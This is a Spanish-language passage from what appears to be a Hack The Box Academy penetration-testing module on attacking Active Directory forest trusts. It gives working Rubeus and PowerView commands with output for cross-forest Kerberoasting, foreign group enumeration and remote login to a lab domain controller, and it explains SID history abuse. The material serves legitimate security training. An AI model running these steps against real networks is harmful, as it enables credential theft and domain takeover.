## Cross-Forest Kerberoasting

Kerberos attacks como Kerberoasting y ASREPRoasting pueden llevarse a cabo a través de trusts, dependiendo de la dirección del trust. En una situación donde estás posicionado en un domain con un inbound o bidirectional domain/forest trust, es probable que puedas realizar varios ataques para obtener un punto de apoyo. A veces no puedes escalar privilegios en tu domain actual, pero en su lugar puedes obtener un Kerberos ticket y crackear un hash para un usuario administrativo en otro domain que tiene Domain/Enterprise Admin privileges en ambos domains.

Podemos utilizar PowerView para enumerar cuentas en un domain objetivo que tienen SPNs asociados con ellas.

### Enumerating Accounts for Associated SPNs Using Get-DomainUser

```r
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

Vemos que hay una cuenta con un SPN en el domain objetivo. Una revisión rápida muestra que esta cuenta es miembro del grupo Domain Admins en el domain objetivo, por lo que si podemos Kerberoast it y crackear el hash offline, tendríamos derechos de administrador completos en el domain objetivo.

### Enumerating the mssqlsvc Account

```r
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Vamos a realizar un ataque de Kerberoasting a través del trust usando `Rubeus`. Ejecutamos la herramienta como lo hicimos en la sección de Kerberoasting, pero incluimos el flag `/domain:` y especificamos el domain objetivo.

### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

```r
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
```

Luego podríamos ejecutar el hash a través de Hashcat. Si se crackea, hemos ampliado rápidamente nuestro acceso para controlar completamente dos domains al aprovechar un ataque bastante estándar y abusar de la dirección de autenticación y configuración del bidirectional forest trust.

---

## Admin Password Re-Use & Group Membership

De vez en cuando, encontraremos una situación donde hay un bidirectional forest trust gestionado por administradores de la misma empresa. Si podemos tomar el control del Domain A y obtener contraseñas en claro o NT hashes para la cuenta de Administrator incorporada (o una cuenta que sea parte del grupo Enterprise Admins o Domain Admins en Domain A), y Domain B tiene una cuenta altamente privilegiada con el mismo nombre, entonces vale la pena verificar la reutilización de contraseñas en los dos forests. Ocasionalmente, me encontré con problemas donde, por ejemplo, Domain A tenía un usuario llamado `adm_bob.smith` en el grupo Domain Admins, y Domain B tenía un usuario llamado `bsmith_admin`. A veces, el usuario usaría la misma contraseña en los dos domains, y tomar el control de Domain A instantáneamente me daba derechos de administrador completos en Domain B.

También podemos ver usuarios o administradores de Domain A como miembros de un grupo en Domain B. Solo `Domain Local Groups` permiten security principals de fuera de su forest. Podemos ver a un Domain Admin o Enterprise Admin de Domain A como miembro del grupo Administrators incorporado en Domain B en una relación de bidirectional forest trust. Si podemos tomar el control de este usuario administrador en Domain A, ganaríamos acceso administrativo completo a Domain B basado en la membresía del grupo.

Podemos usar la función de PowerView [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember) para enumerar grupos con usuarios que no pertenecen al domain, también conocido como `foreign group membership`. Probemos esto contra el domain `FREIGHTLOGISTICS.LOCAL` con el que tenemos un external bidirectional forest trust.

### Using Get-DomainForeignGroupMember

```r
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```

El output del comando anterior muestra que el grupo Administrators incorporado en `FREIGHTLOGISTICS.LOCAL` tiene la cuenta de Administrator incorporada para el domain `INLANEFREIGHT.LOCAL` como miembro. Podemos verificar este acceso usando el cmdlet `Enter-PSSession` para conectarnos a través de WinRM.

### Accessing DC03 Using Enter-PSSession

```r
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
```

Del output del comando anterior, podemos ver que nos autenticamos exitosamente en el Domain Controller en el domain `FREIGHTLOGISTICS.LOCAL` usando la cuenta de Administrator del domain `INLANEFREIGHT.LOCAL` a través del bidirectional forest trust. Esto puede ser una victoria rápida después de tomar el control de un domain y siempre vale la pena verificarlo si hay una situación de bidirectional forest trust presente durante una evaluación y el segundo forest está en el scope.

---

## SID History Abuse - Cross Forest

SID History también puede ser abusado a través de un forest trust. Si un usuario es migrado de un forest a otro y SID Filtering no está habilitado, se vuelve posible agregar un SID del otro forest, y este SID se agregará al token del usuario al autenticarse a través del trust. Si el SID de una cuenta con privilegios administrativos en Forest A se agrega al atributo SID history de una cuenta en Forest B, asumiendo que pueden autenticarse a través del forest, entonces esta cuenta tendrá privilegios administrativos al acceder a recursos en el forest asociado. En el diagrama a continuación, podemos ver un ejemplo del usuario `jjones` siendo migrado del domain `INLANEFREIGHT.LOCAL` al domain `CORP.LOCAL` en un forest diferente. Si SID filtering no está habilitado cuando se realiza esta migración y el usuario tiene privilegios administrativos (o cualquier tipo de derechos interesantes como entradas ACE, acceso a shares, etc.) en el domain `INLANEFREIGHT.LOCAL`, entonces retendrán sus derechos/acceso administrativos en `INLANEFREIGHT.LOCAL` mientras son miembros del nuevo domain, `CORP.LOCAL` en el segundo forest.

![image](https://academy.hackthebox.com/storage/modules/143/sid-history.png)

Este ataque se cubrirá en profundidad en un módulo posterior que se enfocará más en atacar AD trusts.

---

## Onwards

A continuación, veremos algunos ejemplos de ataques a través de un forest trust desde un Linux attack host.
